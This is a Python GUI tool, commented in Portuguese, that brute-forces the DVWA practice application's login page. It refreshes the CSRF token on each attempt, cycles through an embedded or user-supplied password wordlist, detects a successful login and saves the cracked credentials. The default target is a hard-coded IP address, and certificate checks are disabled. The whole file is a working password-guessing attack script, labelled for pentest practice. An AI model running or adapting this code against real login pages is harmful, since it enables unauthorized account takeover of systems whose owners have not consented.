#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DVWA Login Brute Force - GUI (tkinter) - mostra cada senha testada em tempo real
   Botão 'Salvar Senha' grava somente:
     [+] SENHA ENCONTRADA: 'password'
     [+] Credenciais: admin : password
   SEM salvamento automático."""
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import threading, queue, time, os, re
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_WORDLIST = [
    "password", "admin", "admin123", "123456", "12345678", "dvwa", "letmein",
    "root", "toor", "test", "teste", "senha", "senha123", "qwerty", "abc123",
    "welcome", "monkey", "dragon", "master", "iloveyou", "batman", "p@ssw0rd",
    "Passw0rd!", "administrator", "changeme", "1234", "12345", "default",
    "user", "usuario", "dvwa123", "secret", "security", "hacker",
]


def normalizar_base(url):
    """Aceita 'http://host/dvwa' ou 'http://host/dvwa/login.php'."""
    url = url.strip().rstrip("/")
    url = re.sub(r"/(login|setup|index)\.php.*$", "", url, flags=re.IGNORECASE)
    return url


class DVWABruteForce:
    def __init__(self, base_url, username, passwords, log, progress, stop_event,
                 result_callback, verbose=True):
        self.base_url = normalizar_base(base_url)
        self.login_url = self.base_url + "/login.php"
        self.username = username
        self.passwords = passwords
        self.log = log
        self.progress = progress
        self.stop = stop_event
        self.result_callback = result_callback  # avisa a GUI quando achar a senha
        self.verbose = verbose
        self.session = requests.Session()
        self.found = False
        self.use_token = None
        self.last_response_text = ""

    def _get_token(self, text):
        soup = BeautifulSoup(text, "html.parser")
        campo = soup.find("input", {"name": "user_token"})
        return campo["value"] if campo and campo.get("value") else None

    def _get_page(self):
        r = self.session.get(self.login_url, verify=False, timeout=10)
        if r.status_code in (301, 302) and "setup.php" in r.headers.get("Location", ""):
            self.log("[!] DVWA redirecionou para setup.php -> banco de dados NÃO criado.")
            self.log("[!] Acesse http://182.188.2.22/dvwa/setup.php e clique em 'Create / Reset Database'.")
            return None
        return r

    def _try_login(self, password, token):
        data = {"username": self.username, "password": password, "Login": "Login"}
        if token:
            data["user_token"] = token
        try:
            r = self.session.post(self.login_url, data=data, verify=False,
                                  timeout=10, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            self.log(f"[!] Erro na tentativa: {e}")
            return None

        self.last_response_text = r.text

        if r.status_code in (301, 302):
            return "index.php" in r.headers.get("Location", "")

        if "Login failed" in r.text or "incorrect" in r.text.lower():
            return False
        if "You have logged in" in r.text:
            return True
        return "<form" not in r.text

    def run(self):
        total = len(self.passwords)
        self.log(f"[*] Alvo: {self.login_url}\n")
        self.log(f"[*] Usuário: {self.username} | Senhas: {total}")

        r = self._get_page()
        if r is None:
            return
        self.log(f"\n[*] Página de login obtida (HTTP {r.status_code}, {len(r.text)} bytes)\n")

        token = self._get_token(r.text)
        if token:
            self.log("[+] Token CSRF encontrado -> renovando user_token a cada tentativa\n")
            self.use_token = True
        else:
            self.log("[i] Sem campo user_token -> DVWA antigo (1.0.x). Atacando SEM token\n")
            self.use_token = False

        for i, pwd in enumerate(self.passwords, 1):
            if self.stop.is_set():
                self.log("[*] Ataque interrompido pelo usuário.")
                return
            if self.found:
                return
            pwd = pwd.strip()
            if not pwd:
                continue

            if self.verbose:
                self.log(f"[{i}/{total}] Testando: '{pwd}'")
            self.progress(i, total, pwd)

            resultado = self._try_login(pwd, token if self.use_token else None)
            if resultado is None:            # erro de rede
                time.sleep(2)
                continue

            if resultado:
                self.found = True
                self.log("=" * 55)
                self.log(f"[+] SENHA ENCONTRADA: '{pwd}'")
                self.log(f"[+] Credenciais: {self.username} : {pwd}")
                self.log("=" * 55)
                # SEM salvamento automático: senha fica guardada p/ o botão "Salvar Senha"
                self.result_callback(self.username, pwd)
                return

            if self.use_token:
                token = self._get_token(self.last_response_text)
                if not token:
                    time.sleep(1)
                    r2 = self._get_page()
                    token = self._get_token(r2.text) if r2 else None
                if not token:
                    self.log("[!] Token não renovado; pausa de 3s...")
                    time.sleep(3)
                    r2 = self._get_page()
                    token = self._get_token(r2.text) if r2 else None
                    if not token:
                        self.log("[!] Abortando: servidor parou de fornecer token.")
                        return

        if not self.found:
            self.log(f"[-] Nenhuma senha válida encontrada em {total} tentativas.")


class App:
    def __init__(self, root):
        self.root = root
        root.title("DVWA Login Brute Force - Pentest")
        root.geometry("760x680")
        root.resizable(True, True)

        self.stop_event = threading.Event()
        self.worker = None
        self.queue = queue.Queue()
        self.senha_encontrada = None      # (usuario, senha) quando achada

        frm = ttk.LabelFrame(root, text="Configuração do Alvo")
        frm.pack(fill="x", padx=10, pady=8)

        ttk.Label(frm, text="URL (base ou login):").grid(row=0, column=0, sticky="w", padx=5, pady=4)
        self.url_var = tk.StringVar(value="http://182.188.2.22/dvwa/login.php")
        ttk.Entry(frm, textvariable=self.url_var, width=50).grid(row=0, column=1, padx=5, pady=4)

        ttk.Label(frm, text="Usuário:").grid(row=1, column=0, sticky="w", padx=5, pady=4)
        self.user_var = tk.StringVar(value="admin")
        ttk.Entry(frm, textvariable=self.user_var, width=50).grid(row=1, column=1, padx=5, pady=4)

        ttk.Label(frm, text="Wordlist:").grid(row=2, column=0, sticky="w", padx=5, pady=4)
        self.wordlist_var = tk.StringVar(value="")
        ttk.Entry(frm, textvariable=self.wordlist_var, width=50).grid(row=2, column=1, padx=5, pady=4)
        ttk.Button(frm, text="Procurar...", command=self.browse).grid(row=2, column=2, padx=5, pady=4)

        self.verbose_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(frm, text="Exibir cada tentativa no log (desative p/ wordlists gigantes)",
                        variable=self.verbose_var).grid(row=3, column=1, sticky="w", padx=5, pady=4)

        botoes = ttk.Frame(root)
        botoes.pack(fill="x", padx=10, pady=4)
        self.btn_start = ttk.Button(botoes, text="▶ Iniciar Ataque", command=self.start)
        self.btn_start.pack(side="left", padx=5)
        self.btn_stop = ttk.Button(botoes, text="■ Parar", command=self.stop, state="disabled")
        self.btn_stop.pack(side="left", padx=5)
        # ===== BOTÃO RENOMEADO: SALVAR SENHA (salva só as 2 linhas do resultado) =====
        self.btn_save = ttk.Button(botoes, text="💾 Salvar Senha", command=self.salvar_senha)
        self.btn_save.pack(side="left", padx=5)

        self.progress_var = tk.DoubleVar(value=0)
        self.progress_bar = ttk.Progressbar(root, variable=self.progress_var, maximum=100)
        self.progress_bar.pack(fill="x", padx=10, pady=4)
        self.status_var = tk.StringVar(value="Pronto. Clique em Iniciar.")
        ttk.Label(root, textvariable=self.status_var).pack(anchor="w", padx=12)

        self.log_area = scrolledtext.ScrolledText(root, state="disabled", height=18,
                                                  font=("Consolas", 10))
        self.log_area.pack(fill="both", expand=True, padx=10, pady=8)

        root.protocol("WM_DELETE_WINDOW", self.on_close)
        self._poll_queue()

    def browse(self):
        path = filedialog.askopenfilename(
            title="Selecione a wordlist",
            filetypes=[("Arquivos de texto", "*.txt"), ("Todos", "*.*")],
        )
        if path:
            self.wordlist_var.set(path)

    # ===== SALVA SOMENTE AS 2 LINHAS DO RESULTADO =====
    def salvar_senha(self):
        if not self.senha_encontrada:
            messagebox.showinfo("Salvar Senha",
                                "Nenhuma senha encontrada até agora.\n"
                                "Execute o ataque e aguarde o resultado [+].")
            return

        usuario, senha = self.senha_encontrada
        texto = (f"[+] SENHA ENCONTRADA: '{senha}'\n"
                 f"[+] Credenciais: {usuario} : {senha}\n")

        agora = time.strftime("Data  %d_%m_%Y   Hora %H_%M_%S")
        path = filedialog.asksaveasfilename(
            title="Salvar senha encontrada",
            defaultextension=".txt",
            initialfile=f"dvwa_senha_{agora}.txt",
            filetypes=[("Arquivos de texto", "*.txt"), ("Todos", "*.*")],
        )
        if not path:
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(texto)
            messagebox.showinfo("Salvar Senha", f"Senha salva com sucesso:\n{path}")
        except Exception as e:
            messagebox.showerror("Salvar Senha", f"Falha ao salvar:\n{e}")

    def log(self, msg):
        self.queue.put(("log", msg))

    def progress(self, i, total, pwd=""):
        self.queue.put(("progress", (i, total, pwd)))

    def done(self, msg):
        self.queue.put(("done", msg))

    def on_resultado(self, usuario, senha):
        self.queue.put(("resultado", (usuario, senha)))

    def _poll_queue(self):
        try:
            while True:
                kind, payload = self.queue.get_nowait()
                if kind == "log":
                    self.log_area.configure(state="normal")
                    self.log_area.insert("end", payload + "\n")
                    self.log_area.see("end")
                    self.log_area.configure(state="disabled")
                elif kind == "progress":
                    i, total, pwd = payload
                    pct = (i / total) * 100 if total else 0
                    self.progress_var.set(pct)
                    self.status_var.set(f"[{i}/{total}] ({pct:.1f}%) Testando: '{pwd}'")
                elif kind == "resultado":
                    self.senha_encontrada = payload
                    usuario, senha = payload
                    self.status_var.set(f"✔ Senha encontrada: {usuario} : {senha} | Clique em Salvar Senha")
                elif kind == "done":
                    self.btn_start.configure(state="normal")
                    self.btn_stop.configure(state="disabled")
                    self.status_var.set(payload)
        except queue.Empty:
            pass
        self.root.after(100, self._poll_queue)

    def start(self):
        url = self.url_var.get().strip()
        user = self.user_var.get().strip()
        wl_path = self.wordlist_var.get().strip()
        verbose = self.verbose_var.get()

        if not url or not user:
            messagebox.showerror("Erro", "Informe a URL e o usuário.")
            return

        if wl_path:
            if not os.path.isfile(wl_path):
                messagebox.showerror("Erro", f"Arquivo não encontrado:\n{wl_path}")
                return
            try:
                with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
                    passwords = [linha.strip() for linha in f if linha.strip()]
            except Exception as e:
                messagebox.showerror("Erro", f"Falha ao ler wordlist:\n{e}")
                return
            if not passwords:
                messagebox.showerror("Erro", "Wordlist vazia.")
                return
        else:
            passwords = DEFAULT_WORDLIST[:]
            self.log("[*] Nenhuma wordlist selecionada -> usando lista embutida de demonstração.")

        self.stop_event.clear()
        self.senha_encontrada = None
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        self.progress_var.set(0)
        self.log_area.configure(state="normal")
        self.log_area.delete("1.0", "end")
        self.log_area.configure(state="disabled")

        engine = DVWABruteForce(url, user, passwords, self.log, self.progress,
                                 self.stop_event, self.on_resultado, verbose)
        self.worker = threading.Thread(target=self._run_engine, args=(engine,), daemon=True)
        self.worker.start()

    def _run_engine(self, engine):
        try:
            engine.run()
        except Exception as e:
            self.log(f"[!] Erro inesperado: {type(e).__name__}: {e}")
        finally:
            self.done("Ataque finalizado.")

    def stop(self):
        self.stop_event.set()
        self.status_var.set("Parando... aguarde a tentativa atual terminar.")

    def on_close(self):
        self.stop_event.set()
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    App(root)
    root.mainloop()
